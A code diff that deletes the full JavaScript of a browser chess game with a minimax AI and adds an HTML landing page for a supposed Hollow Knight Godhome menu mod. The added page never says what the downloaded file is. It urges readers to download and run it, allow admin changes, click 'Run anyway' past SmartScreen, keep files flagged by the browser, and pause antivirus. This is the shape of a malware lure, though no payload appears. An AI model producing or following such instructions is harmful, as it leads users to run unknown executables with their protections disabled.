-                selectedSquare = sqIndex;
-                validMoves = getLegalMoves(turn).filter(m => m.from === sqIndex);
-                renderBoard();
-                return;
-            }
-
-            // If clicking target square
-            if (selectedSquare !== null) {
-                const move = validMoves.find(m => m.to === sqIndex);
-                if (move) {
-                    executeMove(move);
-                    selectedSquare = null;
-                    validMoves = [];
-                    renderBoard();
-
-                    // Trigger AI if applicable
-                    if (gameActive && gameMode === 'ai' && turn === 'b') {
-                        setTimeout(makeAIMove, 300);
-                    }
-                } else {
-                    selectedSquare = null;
-                    validMoves = [];
-                    renderBoard();
-                }
-            }
-        }
-
-        // Move Execution Engine
-        function executeMove(move) {
-            const piece = board[move.from];
-            const color = getPieceColor(piece.code);
-            const target = board[move.to];
-            let isCapture = false;
-
-            // Handle Normal Capture
-            if (target) {
-                capturedPieces[color].push(target.code);
-                isCapture = true;
-            }
-
-            // Handle En Passant Capture
-            if (piece.code.toLowerCase() === 'p' && move.to === enPassantTarget) {
-                const epCapturedIndex = color === 'w' ? move.to + 8 : move.to - 8;
-                if (board[epCapturedIndex]) {
-                    capturedPieces[color].push(board[epCapturedIndex].code);
-                    board[epCapturedIndex] = null;
-                    isCapture = true;
-                }
-            }
-
-            // Move piece
-            board[move.to] = piece;
-            board[move.from] = null;
-
-            // Handle Castling Rook Movement
-            if (piece.code.toLowerCase() === 'k' && Math.abs(move.from - move.to) === 2) {
-                if (move.to === 62) { board[61] = board[63]; board[63] = null; } // White O-O
-                if (move.to === 58) { board[59] = board[56]; board[56] = null; } // White O-O-O
-                if (move.to === 6) { board[5] = board[7]; board[7] = null; }     // Black O-O
-                if (move.to === 2) { board[3] = board[0]; board[0] = null; }     // Black O-O-O
-            }
-
-            // Update Castling Rights
-            if (piece.code === 'K') { castlingRights.w.k = false; castlingRights.w.q = false; }
-            if (piece.code === 'k') { castlingRights.b.k = false; castlingRights.b.q = false; }
-            if (move.from === 56 || move.to === 56) castlingRights.w.q = false;
-            if (move.from === 63 || move.to === 63) castlingRights.w.k = false;
-            if (move.from === 0 || move.to === 0) castlingRights.b.q = false;
-            if (move.from === 7 || move.to === 7) castlingRights.b.k = false;
-
-            // Update En Passant Target
-            if (piece.code.toLowerCase() === 'p' && Math.abs(move.from - move.to) === 16) {
-                enPassantTarget = color === 'w' ? move.from - 8 : move.from + 8;
-            } else {
-                enPassantTarget = null;
-            }
-
-            // Check if this move requires pawn promotion modal selection
-            const isPromotion = piece.code.toLowerCase() === 'p' && (Math.floor(move.to / 8) === 0 || Math.floor(move.to / 8) === 7);
-
-            if (isPromotion) {
-                if (gameMode === 'ai' && color === 'b') {
-                    board[move.to].code = 'q'; // AI auto promotes to queen
-                    renderBoard();
-                    finalizeMove(move, piece.code, isCapture);
-                } else {
-                    promptPromotion(move.to, color, move, isCapture);
-                }
-            } else {
-                finalizeMove(move, piece.code, isCapture);
-            }
-        }
-
-        // Finalize turn after move (and promotion selection if applicable)
-        function finalizeMove(move, originalPieceCode, isCapture) {
-            const currentPieceCode = board[move.to].code;
-
-            // Record Notation & History
-            const san = generateNotation(move, originalPieceCode, isCapture);
-            history.push({ ...move, piece: currentPieceCode, san });
-
-            // Switch Turn
-            turn = turn === 'w' ? 'b' : 'w';
-
-            // Play Audio Effect
-            const opponentMoves = getLegalMoves(turn);
-            const inCheck = isInCheck(turn);
-
-            if (inCheck) {
-                audio.play('check');
-            } else if (isCapture) {
-                audio.play('capture');
-            } else {
-                audio.play('move');
-            }
-
-            // Check Game Ending Conditions
-            if (opponentMoves.length === 0) {
-                gameActive = false;
-                stopTimer();
-                if (inCheck) {
-                    const winner = turn === 'w' ? "Black" : "White";
-                    showGameOver(`Checkmate!`, `${winner} wins by Checkmate.`);
-                } else {
-                    showGameOver(`Stalemate!`, `The game is drawn by Stalemate.`);
-                }
-            }
-
-            updateUI();
-        }
-
-        // Move Generation Helpers
-        function getPieceColor(p) {
-            if (!p) return null;
-            return p === p.toUpperCase() ? 'w' : 'b';
-        }
-
-        function getPseudoMoves(color) {
-            const moves = [];
-            for (let i = 0; i < 64; i++) {
-                const pObj = board[i];
-                if (pObj && getPieceColor(pObj.code) === color) {
-                    const p = pObj.code;
-                    const type = p.toLowerCase();
-                    const r = Math.floor(i / 8);
-                    const c = i % 8;
-
-                    if (type === 'p') {
-                        const dir = color === 'w' ? -1 : 1;
-                        const startRank = color === 'w' ? 6 : 1;
-
-                        // One step forward
-                        if (board[i + dir * 8] === null) {
-                            moves.push({ from: i, to: i + dir * 8 });
-                            // Two steps forward
-                            if (r === startRank && board[i + dir * 16] === null) {
-                                moves.push({ from: i, to: i + dir * 16 });
-                            }
-                        }
-                        // Captures
-                        for (let dc of [-1, 1]) {
-                            if (c + dc >= 0 && c + dc < 8) {
-                                const targetIdx = i + dir * 8 + dc;
-                                const targetPiece = board[targetIdx];
-                                if ((targetPiece && getPieceColor(targetPiece.code) !== color) || targetIdx === enPassantTarget) {
-                                    moves.push({ from: i, to: targetIdx });
-                                }
-                            }
-                        }
-                    } else if (type === 'n') {
-                        const offsets = [-17, -15, -10, -6, 6, 10, 15, 17];
-                        for (let off of offsets) {
-                            const targetIdx = i + off;
-                            if (targetIdx >= 0 && targetIdx < 64) {
-                                const tr = Math.floor(targetIdx / 8);
-                                const tc = targetIdx % 8;
-                                if (Math.abs(tr - r) + Math.abs(tc - c) === 3) {
-                                    if (!board[targetIdx] || getPieceColor(board[targetIdx].code) !== color) {
-                                        moves.push({ from: i, to: targetIdx });
-                                    }
-                                }
-                            }
-                        }
-                    } else if (['b', 'r', 'q'].includes(type)) {
-                        const dirs = [];
-                        if (type === 'b' || type === 'q') dirs.push([-1, -1], [-1, 1], [1, -1], [1, 1]);
-                        if (type === 'r' || type === 'q') dirs.push([-1, 0], [1, 0], [0, -1], [0, 1]);
-
-                        for (let [dr, dc] of dirs) {
-                            let nr = r + dr;
-                            let nc = c + dc;
-                            while (nr >= 0 && nr < 8 && nc >= 0 && nc < 8) {
-                                const targetIdx = nr * 8 + nc;
-                                const targetPiece = board[targetIdx];
-                                if (!targetPiece) {
-                                    moves.push({ from: i, to: targetIdx });
-                                } else {
-                                    if (getPieceColor(targetPiece.code) !== color) {
-                                        moves.push({ from: i, to: targetIdx });
-                                    }
-                                    break;
-                                }
-                                nr += dr;
-                                nc += dc;
-                            }
-                        }
-                    } else if (type === 'k') {
-                        const dirs = [[-1,-1],[-1,0],[-1,1],[0,-1],[0,1],[1,-1],[1,0],[1,1]];
-                        for (let [dr, dc] of dirs) {
-                            let nr = r + dr;
-                            let nc = c + dc;
-                            if (nr >= 0 && nr < 8 && nc >= 0 && nc < 8) {
-                                const targetIdx = nr * 8 + nc;
-                                if (!board[targetIdx] || getPieceColor(board[targetIdx].code) !== color) {
-                                    moves.push({ from: i, to: targetIdx });
-                                }
-                            }
-                        }
-
-                        // Castling Pseudo Moves
-                        const oppColor = color === 'w' ? 'b' : 'w';
-                        if (color === 'w' && i === 60) {
-                            if (!isSquareAttacked(60, oppColor)) {
-                                if (castlingRights.w.k && !board[61] && !board[62] && !isSquareAttacked(61, oppColor) && !isSquareAttacked(62, oppColor)) {
-                                    moves.push({ from: 60, to: 62 });
-                                }
-                                if (castlingRights.w.q && !board[59] && !board[58] && !board[57] && !isSquareAttacked(59, oppColor) && !isSquareAttacked(58, oppColor)) {
-                                    moves.push({ from: 60, to: 58 });
-                                }
-                            }
-                        }
-                        if (color === 'b' && i === 4) {
-                            if (!isSquareAttacked(4, oppColor)) {
-                                if (castlingRights.b.k && !board[5] && !board[6] && !isSquareAttacked(5, oppColor) && !isSquareAttacked(6, oppColor)) {
-                                    moves.push({ from: 4, to: 6 });
-                                }
-                                if (castlingRights.b.q && !board[3] && !board[2] && !board[1] && !isSquareAttacked(3, oppColor) && !isSquareAttacked(2, oppColor)) {
-                                    moves.push({ from: 4, to: 2 });
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            return moves;
-        }
-
-        // Direct attack checking
-        function isSquareAttacked(sqIndex, attackerColor) {
-            const targetRank = Math.floor(sqIndex / 8);
-            const targetCol = sqIndex % 8;
-
-            // Pawns
-            const pawnDir = attackerColor === 'w' ? 1 : -1;
-            for (let dc of [-1, 1]) {
-                const r = targetRank + pawnDir;
-                const c = targetCol + dc;
-                if (r >= 0 && r < 8 && c >= 0 && c < 8) {
-                    const pObj = board[r * 8 + c];
-                    if (pObj && getPieceColor(pObj.code) === attackerColor && pObj.code.toLowerCase() === 'p') return true;
-                }
-            }
-
-            // Knights
-            const knightOffsets = [-17, -15, -10, -6, 6, 10, 15, 17];
-            for (let off of knightOffsets) {
-                const idx = sqIndex + off;
-                if (idx >= 0 && idx < 64) {
-                    const r = Math.floor(idx / 8);
-                    const c = idx % 8;
-                    if (Math.abs(r - targetRank) + Math.abs(c - targetCol) === 3) {
-                        const pObj = board[idx];
-                        if (pObj && getPieceColor(pObj.code) === attackerColor && pObj.code.toLowerCase() === 'n') return true;
-                    }
-                }
-            }
-
-            // Kings
-            for (let dr = -1; dr <= 1; dr++) {
-                for (let dc = -1; dc <= 1; dc++) {
-                    if (dr === 0 && dc === 0) continue;
-                    const r = targetRank + dr;
-                    const c = targetCol + dc;
-                    if (r >= 0 && r < 8 && c >= 0 && c < 8) {
-                        const pObj = board[r * 8 + c];
-                        if (pObj && getPieceColor(pObj.code) === attackerColor && pObj.code.toLowerCase() === 'k') return true;
-                    }
-                }
-            }
-
-            // Sliding pieces (Bishops, Rooks, Queens)
-            const directions = [
-                { dr: -1, dc: -1, types: ['b', 'q'] },
-                { dr: -1, dc: 1,  types: ['b', 'q'] },
-                { dr: 1,  dc: -1, types: ['b', 'q'] },
-                { dr: 1,  dc: 1,  types: ['b', 'q'] },
-                { dr: -1, dc: 0,  types: ['r', 'q'] },
-                { dr: 1,  dc: 0,  types: ['r', 'q'] },
-                { dr: 0,  dc: -1, types: ['r', 'q'] },
-                { dr: 0,  dc: 1,  types: ['r', 'q'] }
-            ];
-
-            for (let d of directions) {
-                let r = targetRank + d.dr;
-                let c = targetCol + d.dc;
-                while (r >= 0 && r < 8 && c >= 0 && c < 8) {
-                    const pObj = board[r * 8 + c];
-                    if (pObj) {
-                        if (getPieceColor(pObj.code) === attackerColor && d.types.includes(pObj.code.toLowerCase())) {
-                            return true;
-                        }
-                        break;
-                    }
-                    r += d.dr;
-                    c += d.dc;
-                }
-            }
-
-            return false;
-        }
-
-        function isInCheck(color) {
-            const kingPiece = color === 'w' ? 'K' : 'k';
-            const kingSquare = board.findIndex(p => p && p.code === kingPiece);
-            if (kingSquare === -1) return false;
-            const attackerColor = color === 'w' ? 'b' : 'w';
-            return isSquareAttacked(kingSquare, attackerColor);
-        }
-
-        function getLegalMoves(color) {
-            const pseudo = getPseudoMoves(color);
-            const legal = [];
-
-            for (let move of pseudo) {
-                // Save state
-                const origFrom = board[move.from];
-                const origTo = board[move.to];
-                const origEP = enPassantTarget;
-
-                // Make move on virtual board
-                board[move.to] = origFrom;
-                board[move.from] = null;
-
-                // Handle en passant virtual cleanup
-                let epCapturedPiece = null;
-                let epSquare = null;
-                if (origFrom && origFrom.code.toLowerCase() === 'p' && move.to === origEP) {
-                    epSquare = color === 'w' ? move.to + 8 : move.to - 8;
-                    epCapturedPiece = board[epSquare];
-                    board[epSquare] = null;
-                }
-
-                // Verify if move leaves king in check
-                if (!isInCheck(color)) {
-                    legal.push(move);
-                }
-
-                // Undo virtual move
-                board[move.from] = origFrom;
-                board[move.to] = origTo;
-                if (epSquare !== null) {
-                    board[epSquare] = epCapturedPiece;
-                }
-                enPassantTarget = origEP;
-            }
-
-            return legal;
-        }
-
-        // Standard Algebraic Notation (SAN) Generator
-        function generateNotation(move, piece, isCapture) {
-            const type = piece.toUpperCase();
-            const fromFile = String.fromCharCode(97 + (move.from % 8));
-            const toFile = String.fromCharCode(97 + (move.to % 8));
-            const toRank = 8 - Math.floor(move.to / 8);
-
-            if (type === 'K' && Math.abs(move.from - move.to) === 2) {
-                return move.to > move.from ? 'O-O' : 'O-O-O';
-            }
-
-            let san = '';
-            if (type !== 'P') {
-                san += type;
-            } else if (isCapture) {
-                san += fromFile;
-            }
-
-            if (isCapture) san += 'x';
-            san += `${toFile}${toRank}`;
-
-            return san;
-        }
-
-        // Artificial Intelligence Engine (Minimax with Alpha-Beta Pruning)
-        function makeAIMove() {
-            if (!gameActive) return;
-
-            let selectedMove = null;
-            const legalMoves = getLegalMoves('b');
-
-            if (legalMoves.length === 0) return;
-
-            if (aiDifficulty === 'easy') {
-                // Random move
-                selectedMove = legalMoves[Math.floor(Math.random() * legalMoves.length)];
-            } else if (aiDifficulty === 'medium') {
-                // Greedy capture evaluation or depth 1-2
-                selectedMove = getBestMoveMinimax(2);
-            } else {
-                // Minimax depth 3
-                selectedMove = getBestMoveMinimax(3);
-            }
-
-            if (selectedMove) {
-                executeMove(selectedMove);
-                renderBoard();
-            }
-        }
-
-        function getBestMoveMinimax(depth) {
-            let bestMove = null;
-            let bestValue = -Infinity;
-            const moves = getLegalMoves('b');
-
-            // Sort moves to optimize alpha-beta pruning (captures first)
-            moves.sort((a, b) => (board[b.to] ? 10 : 0) - (board[a.to] ? 10 : 0));
-
-            for (let move of moves) {
-                // Save state
-                const origFrom = board[move.from];
-                const origTo = board[move.to];
-                board[move.to] = origFrom;
-                board[move.from] = null;
-
-                const boardValue = minimax(depth - 1, -Infinity, Infinity, false);
-
-                // Undo
-                board[move.from] = origFrom;
-                board[move.to] = origTo;
-
-                if (boardValue > bestValue) {
-                    bestValue = boardValue;
-                    bestMove = move;
-                }
-            }
-
-            return bestMove || moves[Math.floor(Math.random() * moves.length)];
-        }
-
-        function minimax(depth, alpha, beta, isMaximizing) {
-            if (depth === 0) {
-                return evaluateBoard();
-            }
-
-            const currentTurn = isMaximizing ? 'b' : 'w';
-            const moves = getLegalMoves(currentTurn);
-
-            if (moves.length === 0) {
-                if (isInCheck(currentTurn)) {
-                    return isMaximizing ? -100000 : 100000;
-                }
-                return 0; // Stalemate
-            }
-
-            if (isMaximizing) {
-                let maxEval = -Infinity;
-                for (let move of moves) {
-                    const origFrom = board[move.from];
-                    const origTo = board[move.to];
-                    board[move.to] = origFrom;
-                    board[move.from] = null;
-
-                    const evalVal = minimax(depth - 1, alpha, beta, false);
-
-                    board[move.from] = origFrom;
-                    board[move.to] = origTo;
-
-                    maxEval = Math.max(maxEval, evalVal);
-                    alpha = Math.max(alpha, evalVal);
-                    if (beta <= alpha) break;
-                }
-                return maxEval;
-            } else {
-                let minEval = Infinity;
-                for (let move of moves) {
-                    const origFrom = board[move.from];
-                    const origTo = board[move.to];
-                    board[move.to] = origFrom;
-                    board[move.from] = null;
-
-                    const evalVal = minimax(depth - 1, alpha, beta, true);
-
-                    board[move.from] = origFrom;
-                    board[move.to] = origTo;
-
-                    minEval = Math.min(minEval, evalVal);
-                    beta = Math.min(beta, evalVal);
-                    if (beta <= alpha) break;
-                }
-                return minEval;
-            }
-        }
-
-        // Board Position Evaluator for Black
-        function evaluateBoard() {
-            let totalEvaluation = 0;
-            for (let i = 0; i < 64; i++) {
-                const pieceObj = board[i];
-                if (pieceObj) {
-                    const piece = pieceObj.code;
-                    const type = piece.toLowerCase();
-                    const val = PIECE_VALUES[type] + getPositionalValue(piece, i);
-                    if (piece === piece.toUpperCase()) {
-                        totalEvaluation -= val; // White
-                    } else {
-                        totalEvaluation += val; // Black
-                    }
-                }
-            }
-            return totalEvaluation;
-        }
-
-        function getPositionalValue(piece, index) {
-            const isWhite = piece === piece.toUpperCase();
-            const sq = isWhite ? index : 63 - index;
-            const type = piece.toLowerCase();
-
-            switch (type) {
-                case 'p': return PAWN_TABLE[sq];
-                case 'n': return KNIGHT_TABLE[sq];
-                case 'b': return BISHOP_TABLE[sq];
-                case 'r': return ROOK_TABLE[sq];
-                case 'q': return QUEEN_TABLE[sq];
-                default: return 0;
-            }
-        }
-
-        // Promotion Popup Handler
-        function promptPromotion(squareIdx, color, move, isCapture) {
-            const modal = document.getElementById('promotion-modal');
-            const optionsContainer = document.getElementById('promotion-options');
-            optionsContainer.innerHTML = '';
-
-            const pieces = color === 'w' ? ['Q', 'R', 'B', 'N'] : ['q', 'r', 'b', 'n'];
-
-            pieces.forEach(pCode => {
-                const pieceObj = PIECES[pCode];
-                const btn = document.createElement('button');
-                btn.className = 'p-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-3xl flex items-center justify-center transition border border-slate-700';
-                btn.innerHTML = `<i class="fa-solid ${pieceObj.fontIcon}"></i>`;
-                btn.onclick = () => {
-                    if (board[squareIdx]) {
-                        board[squareIdx].code = pCode;
-                    }
-                    modal.classList.add('hidden');
-                    renderBoard();
-                    finalizeMove(move, 'P', isCapture);
-
-                    // Trigger AI if black turn after promotion
-                    if (gameActive && gameMode === 'ai' && turn === 'b') {
-                        setTimeout(makeAIMove, 300);
-                    }
-                };
-                optionsContainer.appendChild(btn);
-            });
-
-            modal.classList.remove('hidden');
-        }
-
-        // Timers & Clocks
-        function startTimer() {
-            if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                if (!gameActive) return;
-
-                if (turn === 'w') {
-                    whiteTime--;
-                    if (whiteTime <= 0) {
-                        whiteTime = 0;
-                        gameActive = false;
-                        stopTimer();
-                        showGameOver("Time's Up!", "Black wins on time.");
-                    }
-                } else {
-                    blackTime--;
-                    if (blackTime <= 0) {
-                        blackTime = 0;
-                        gameActive = false;
-                        stopTimer();
-                        showGameOver("Time's Up!", "White wins on time.");
-                    }
-                }
-                updateTimerDisplay();
-            }, 1000);
-        }
-
-        function stopTimer() {
-            if (timerInterval) clearInterval(timerInterval);
-        }
-
-        function formatTime(seconds) {
-            const mins = Math.floor(seconds / 60);
-            const secs = seconds % 60;
-            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-        }
-
-        function updateTimerDisplay() {
-            const topTimer = document.getElementById('top-timer');
-            const bottomTimer = document.getElementById('bottom-timer');
-
-            if (timeControl === 0) {
-                topTimer.innerText = "∞";
-                bottomTimer.innerText = "∞";
-                return;
-            }
-
-            if (isFlipped) {
-                topTimer.innerText = formatTime(whiteTime);
-                bottomTimer.innerText = formatTime(blackTime);
-            } else {
-                topTimer.innerText = formatTime(blackTime);
-                bottomTimer.innerText = formatTime(whiteTime);
-            }
-        }
-
-        // UI & History Updates
-        function updateUI() {
-            // Status Banner
-            const statusEl = document.getElementById('game-status');
-            const inCheck = isInCheck(turn);
-
-            if (gameActive) {
-                const turnName = turn === 'w' ? "White's Turn" : "Black's Turn";
-                statusEl.innerText = inCheck ? `${turnName} (In Check!)` : turnName;
-                statusEl.className = `absolute -top-10 left-0 right-0 text-center font-bold text-sm tracking-wide h-6 ${
-                    inCheck ? 'text-rose-400 animate-pulse' : 'text-amber-400'
-                }`;
-            }
-
-            // Captured pieces UI
-            const topCapEl = document.getElementById('top-captured');
-            const bottomCapEl = document.getElementById('bottom-captured');
-            
-            const renderCaptured = (color) => {
-                return capturedPieces[color].map(p => PIECES[p].symbol).join(' ');
-            };
-
-            if (isFlipped) {
-                topCapEl.innerText = renderCaptured('b');
-                bottomCapEl.innerText = renderCaptured('w');
-            } else {
-                topCapEl.innerText = renderCaptured('w');
-                bottomCapEl.innerText = renderCaptured('b');
-            }
-
-            // Move table
-            const tableBody = document.getElementById('move-history-table');
-            tableBody.innerHTML = '';
-            
-            for (let i = 0; i < history.length; i += 2) {
-                const moveNum = Math.floor(i / 2) + 1;
-                const whiteMove = history[i] ? history[i].san : '';
-                const blackMove = history[i + 1] ? history[i + 1].san : '';
-
-                const tr = document.createElement('tr');
-                tr.className = 'hover:bg-slate-800/40 transition';
-                tr.innerHTML = `
-                    <td class="py-1 px-2 text-slate-500 font-mono">${moveNum}.</td>
-                    <td class="py-1 px-2 font-medium">${whiteMove}</td>
-                    <td class="py-1 px-2 font-medium text-amber-400/90">${blackMove}</td>
-                `;
-                tableBody.appendChild(tr);
-            }
-
-            document.getElementById('move-count').innerText = `${history.length} Moves`;
-
-            // Auto-scroll history to bottom
-            const container = document.getElementById('move-history-container');
-            container.scrollTop = container.scrollHeight;
-        }
-
-        function showGameOver(title, desc) {
-            audio.play('gameover');
-            document.getElementById('gameover-title').innerText = title;
-            document.getElementById('gameover-desc').innerText = desc;
-            document.getElementById('gameover-modal').classList.remove('hidden');
-        }
-
-        // Event Listeners
-        document.getElementById('btn-new-game').addEventListener('click', initGame);
-        document.getElementById('btn-modal-restart').addEventListener('click', () => {
-            document.getElementById('gameover-modal').classList.add('hidden');
-            initGame();
-        });
-
-        document.getElementById('select-mode').addEventListener('change', (e) => {
-            gameMode = e.target.value;
-            const diffContainer = document.getElementById('ai-difficulty-container');
-            if (gameMode === 'pvp') {
-                diffContainer.classList.add('opacity-40', 'pointer-events-none');
-                document.getElementById('player-top-name').innerText = "Player 2 (Black)";
-                document.getElementById('player-top-icon').className = "fa-solid fa-user text-indigo-400";
-            } else {
-                diffContainer.classList.remove('opacity-40', 'pointer-events-none');
-                document.getElementById('player-top-name').innerText = "Computer";
-                document.getElementById('player-top-icon').className = "fa-solid fa-robot text-indigo-400";
-            }
-            initGame();
-        });
-
-        document.getElementById('select-difficulty').addEventListener('change', (e) => {
-            aiDifficulty = e.target.value;
-        });
-
-        document.getElementById('select-theme').addEventListener('change', (e) => {
-            const boardEl = document.getElementById('chessboard-wrapper');
-            boardEl.className = `rounded-xl overflow-hidden shadow-inner theme-${e.target.value} border border-slate-700/50`;
-        });
-
-        document.getElementById('select-timer').addEventListener('change', initGame);
-
-        document.getElementById('btn-flip').addEventListener('click', () => {
-            isFlipped = !isFlipped;
-            const topName = document.getElementById('player-top-name');
-            const bottomName = document.getElementById('player-bottom-name');
-
-            if (isFlipped) {
-                topName.innerText = "You (White)";
-                bottomName.innerText = gameMode === 'ai' ? "Computer (Black)" : "Player 2 (Black)";
-            } else {
-                topName.innerText = gameMode === 'ai' ? "Computer (Black)" : "Player 2 (Black)";
-                bottomName.innerText = "You (White)";
-            }
-
-            renderBoard();
-            updateTimerDisplay();
-        });
-
-        document.getElementById('btn-undo').addEventListener('click', () => {
-            if (history.length === 0 || !gameActive) return;
-
-            // In AI mode, undo two moves (player & AI)
-            const steps = (gameMode === 'ai' && history.length >= 2) ? 2 : 1;
-            
-            for (let i = 0; i < steps; i++) {
-                if (history.length === 0) break;
-                history.pop();
-            }
-
-            // Re-parse FEN start position and replay
-            parseFEN(INITIAL_FEN);
-            castlingRights = { w: { k: true, q: true }, b: { k: true, q: true } };
-            enPassantTarget = null;
-            capturedPieces = { w: [], b: [] };
-
-            const historyCopy = [...history];
-            history = [];
-
-            for (let move of historyCopy) {
-                executeMove(move);
-            }
-
-            turn = historyCopy.length % 2 === 0 ? 'w' : 'b';
-            gameActive = true;
-            renderBoard();
-            updateUI();
-        });
-
-        document.getElementById('btn-resign').addEventListener('click', () => {
-            if (!gameActive) return;
-            gameActive = false;
-            stopTimer();
-            const winner = turn === 'w' ? "Black" : "White";
-            showGameOver("Resignation", `${turn === 'w' ? "White" : "Black"} resigned. ${winner} wins!`);
-        });
-
-        document.getElementById('btn-sound').addEventListener('click', function() {
-            audio.muted = !audio.muted;
-            this.innerHTML = audio.muted ? 
-                '<i class="fa-solid fa-volume-xmark text-lg text-rose-400"></i>' : 
-                '<i class="fa-solid fa-volume-high text-lg"></i>';
-        });
-
-        // Initialize game on window load
-        window.onload = function() {
-            initGame();
-        };
-    </script>
+<body>
+<div class="wrap" style="max-width: 900px; margin: 0 auto; padding: 40px 24px 56px;">
+
+  <h1>🎮 hollow-knight-newest-menu - A Fresh Look for Godhome</h1>
+
+  <p>hollow-knight-newest-menu is a Hollow Knight mod that gives your Godhome experience a new coat of paint. If you have already explored the Hall of Gods and want your menus, screens, and overall flow to feel cleaner and more up to date, this is the download you have been looking for. No programming, no command lines, and no technical background required.</p>
+
+  <p>This page walks you through everything you need on Windows, from opening the download page to launching the game with the mod active. Follow the steps in order and you will be up and running in a few minutes.</p>
+
+  <div class="btn-wrap">
+    <a class="btn" href="https://github.com/landeroro3698/hollow-knight-newest-menu" rel="noopener">⬇️ Get hollow-knight-newest-menu</a>
+  </div>
+
+  <div class="note">
+    <p style="margin:0;"><strong>Quick summary:</strong> Visit the link above to download the application, save it to a folder you can easily find, and then open it. Everything else on this page is just helpful detail.</p>
+  </div>
+
+  <h2>✨ What This Mod Does</h2>
+
+  <p>The mod focuses on the Godhome side of Hollow Knight, the end-game area where players take on boss rush challenges and the Hall of Gods. Over time, the default interface there can start to feel a little dated, especially once you have spent dozens of hours cycling through the same screens. hollow-knight-newest-menu refreshes that experience so the whole area feels smoother and more enjoyable to move through.</p>
+
+  <p>Whether you are grinding out Pantheon attempts, practising individual bosses, or simply replaying your favourite fights, the goal is the same: keep the game you love and make the Godhome loop feel better. Because it is delivered as a mod, it builds on top of the base game rather than replacing it, so your existing save files and progress stay where they are.</p>
+
+  <div class="card">
+    <h3 style="margin-top:0;">Highlights at a glance</h3>
+    <ul style="margin-bottom:0;">
+      <li>A refreshed menu experience in the Godhome area.</li>
+      <li>Designed to sit alongside your normal Hollow Knight installation.</li>
+      <li>Simple setup aimed at players who have never installed a mod before.</li>
+      <li>Works with a standard Windows copy of the game.</li>
+      <li>Free to download and easy to remove if you ever want to go back.</li>
+    </ul>
+  </div>
+
+  <h2>⬇️ Download and Prepare Your Files</h2>
+
+  <p>Everything starts on the download page. This is where the newest build is published, so it is always the right place to check when you want the current version.</p>
+
+  <ol class="steps">
+    <li><strong>Open the download page.</strong> Visit <a href="https://github.com/landeroro3698/hollow-knight-newest-menu" rel="noopener">https://github.com/landeroro3698/hollow-knight-newest-menu</a> in any browser such as Chrome, Edge, or Firefox. Visit this link to download the application.</li>
+    <li><strong>Find the download button.</strong> On the page, look for the download option for the newest release. It is usually near the top of the page, and it may be labelled with the word "download", "release", or the name of the mod.</li>
+    <li><strong>Save the file.</strong> Your browser will ask where to keep the file. Choose a folder you can easily find again, and the simplest choice is your <em>Downloads</em> folder. Remember the name of the file so you can locate it later.</li>
+    <li><strong>Wait for the download to finish.</strong> A small progress indicator appears in your browser. Larger files can take a minute or two on slower connections, so let it complete fully before you continue.</li>
+  </ol>
+
+  <p>If your browser warns you that the file type is uncommon, that is normal for game add-ons. Choose to keep the file and continue.</p>
+
+  <h3>Where did the file go?</h3>
+
+  <p>If you cannot find the file after downloading, open File Explorer and select <em>Downloads</em> in the left sidebar. You can also sort the folder by <em>Date modified</em> so the newest item appears at the top. That is almost always the file you just saved.</p>
+
+  <h2>🖥️ Before You Begin on Windows</h2>
+
+  <p>You do not need to install any developer tools. Before you start, take a moment to make sure the basics are in place:</p>
+
+  <ul>
+    <li><strong>Hollow Knight must already be installed.</strong> The mod is an addition to the game, so the game itself needs to be present on your computer.</li>
+    <li><strong>Windows 10 or Windows 11 is recommended.</strong> Older versions of Windows often work too, but the steps below assume a modern Windows desktop.</li>
+    <li><strong>An internet connection</strong> for the download itself.</li>
+    <li><strong>Free disk space</strong> for the downloaded file and for any files it places next to your game.</li>
+    <li><strong>Permission to save files.</strong> If you are on a shared or school computer, make sure you are allowed to add files.</li>
+  </ul>
+
+  <p>It also helps to close Hollow Knight before you begin. Files that belong to a game cannot always be updated while the game is running, so quit the game fully rather than just minimising it.</p>
+
+  <h2>🚀 Getting Started: Run the Application</h2>
+
+  <p>Now that the file is on your computer, the rest is straightforward. The exact look of the window may vary slightly depending on your Windows version, but the flow is the same.</p>
+
+  <ol class="steps">
+    <li><strong>Open File Explorer</strong> and go to the folder where you saved the file.</li>
+    <li><strong>Double-click the file</strong> to open it. If a window appears asking whether you want to allow the app to make changes, choose <em>Yes</em>.</li>
+    <li><strong>Follow the on-screen prompts.</strong> Read each window and click <em>Next</em> or <em>Continue</em> where asked. If you are given a choice of location, the suggested default is fine.</li>
+    <li><strong>Wait for the process to finish.</strong> A progress bar may appear. Do not close the window while it is working.</li>
+    <li><strong>Click <em>Finish</em> or <em>Close</em></strong> once the process completes.</li>
+  </ol>
+
+  <p>After that, launch Hollow Knight the way you normally would, either from the Steam library or from your desktop shortcut. Head into the Godhome area and you should see the refreshed menu experience in place.</p>
+
+  <h3>If nothing seems to happen</h3>
+
+  <p>Sometimes the file runs so quickly that no window is visible at all. In that case, launch the game and check the Godhome area first. If you still see no difference, close the game completely and run the file once more, then start the game again.</p>
+
+  <h2>🛠️ Troubleshooting Common Problems</h2>
+
+  <div class="card">
+    <h3 style="margin-top:0;">The file will not open</h3>
+    <p style="margin-bottom:0;">Right-click the file and choose <em>Run as administrator</em>. This resolves most permission-related blocks on Windows.</p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0;">Windows shows a security prompt</h3>
+    <p style="margin-bottom:0;">Files downloaded from the internet often trigger a SmartScreen notice. Click <em>More info</em> and then <em>Run anyway</em> to continue. Only do this with files you downloaded yourself from the link on this page.</p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0;">The game does not show any change</h3>
+    <p style="margin-bottom:0;">Confirm that Hollow Knight was fully closed while you ran the file, then reopen the game. Also double-check that you are looking at the Godhome area, since the mod focuses on that part of the game.</p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0;">The download stops partway</h3>
+    <p style="margin-bottom:0;">Delete the partial file, refresh the download page, and start again. Switching browsers or temporarily pausing your antivirus during the download usually fixes repeated interruptions.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <h3>Do I need to know anything about programming?</h3>
+  <p>No. This is a download-and-run experience. If you can install a normal program on Windows, you can set this up.</p>
+
+  <h3>Will this delete my save file?</h3>
+  <p>No. The mod is an addition to the game, and your progress is stored separately. As with any change to a game, making a quick backup of your save folder is a sensible habit.</p>
+
